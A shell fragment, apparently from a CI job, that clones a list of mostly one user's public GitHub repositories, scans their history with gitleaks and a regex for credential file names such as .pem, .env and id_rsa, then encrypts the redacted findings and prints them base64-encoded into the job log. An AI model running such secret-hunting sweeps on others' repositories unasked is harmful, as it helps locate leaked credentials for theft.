          CERT
          cat > scan.py <<'PY'
          import json, os, pathlib, re, subprocess, sys
          work = pathlib.Path.cwd()
          repos = ["killjoy00/mtg-ev-analyzer","killjoy00/budget","killjoy00/votepredict","killjoy00/sketch","killjoy00/planit","killjoy00/foodfinder","killjoy00/ideatracker","killjoy00/AIProjectManager","killjoy00/BoardgameEngine","killjoy00/Polarized","killjoy00/EZTrivia","killjoy00/GoldRush","killjoy00/splitdecision","killjoy00/Grudge","killjoy00/killjoy00.github.io","killjoy00/SoccerTime","killjoy00/Hollywood","killjoy00/ministry","killjoy00/Starport","killjoy00/StarRun","killjoy00/Ultttt","killjoy00/TurnPro","killjoy00/mobilereleases","jwildfire/gameon"]
          result = []
          def run(args, timeout, stdout=None):
              try:
                  return subprocess.run(args, stdout=stdout if stdout is not None else subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL, timeout=timeout, check=False).returncode
              except (subprocess.TimeoutExpired, OSError):
                  return -1
          for i, repo in enumerate(repos):
              row = {"repo":repo,"status":"clone_failed","findings":[],"sensitive_paths":[]}
              dest = work/"repo.git"
              report = work/"report.json"
              paths = work/"paths"
              clone = run(["git","-c","core.hooksPath=/dev/null","clone","--mirror","--quiet","https://github.com/"+repo+".git",str(dest)],300)
              if clone == 0:
                  refs=run(["git","-C",str(dest),"show-ref","--quiet"],30)
                  if refs == 1:
                      row["status"]="empty"
                  elif refs == 0:
                      scan = run([str(work/"gitleaks"),"git","--log-opts=--all","--redact=100","--report-format=json","--report-path="+str(report),"--exit-code=23","--no-banner",str(dest)],600)
                      row["status"] = "scanned" if scan in (0,23) else "scan_incomplete"
                      if report.exists():
                          try:
                              matches=json.loads(report.read_text())
                              for f in matches or []:
                                  row["findings"].append({"rule":f.get("RuleID"),"path":f.get("File"),"commit":f.get("Commit"),"line":f.get("StartLine")})
                          except (ValueError,TypeError,AttributeError):
                              row["status"]="report_invalid"
                      elif scan==23:
                          row["status"]="report_missing"
                      with paths.open("wb") as output:
                          rc=run(["git","-C",str(dest),"log","--all","--full-history","--format=","--name-only","--diff-filter=AM","-z"],180,output)
                      row["filename_scan_complete"]=rc==0
                      if rc==0:
                          for p in sorted(set(paths.read_bytes().decode("utf-8","replace").split("\0"))):
                              p=p.strip()
                              name=p.rsplit("/",1)[-1].lower()
                              if not p: continue
                              if re.search(r"(^\.env($|\.)|\.p12$|\.pfx$|\.jks$|\.keystore$|\.p8$|\.key$|\.pem$|service[-_]?account.*\.json$|credentials\.json$|^id_(rsa|ed25519|ecdsa)$)",name) and not re.search(r"(example|sample|template|fixture|\.pub$|\.test\.)",name):
                                  row["sensitive_paths"].append(p)
                  else:
                      row["status"]="ref_check_failed"
              result.append(row)
              # The public log contains no candidate information, raw values, file names or commit messages.
              print("Repository scan step %d/%d finished"%(i+1,len(repos)),flush=True)
              import shutil
              shutil.rmtree(dest,ignore_errors=True)
              report.unlink(missing_ok=True)
              paths.unlink(missing_ok=True)
          (work/"redacted.json").write_text(json.dumps(result,separators=(",",":")))
          PY
          python3 scan.py
          gzip -c redacted.json > redacted.json.gz
          openssl cms -encrypt -binary -aes-256-cbc -in redacted.json.gz -outform DER -out report.cms cert.pem
          echo 'Encrypted redacted report follows'
          base64 -w 120 report.cms | sed 's/^/AUDIT_ENC /'
          echo 'Encrypted redacted report complete'
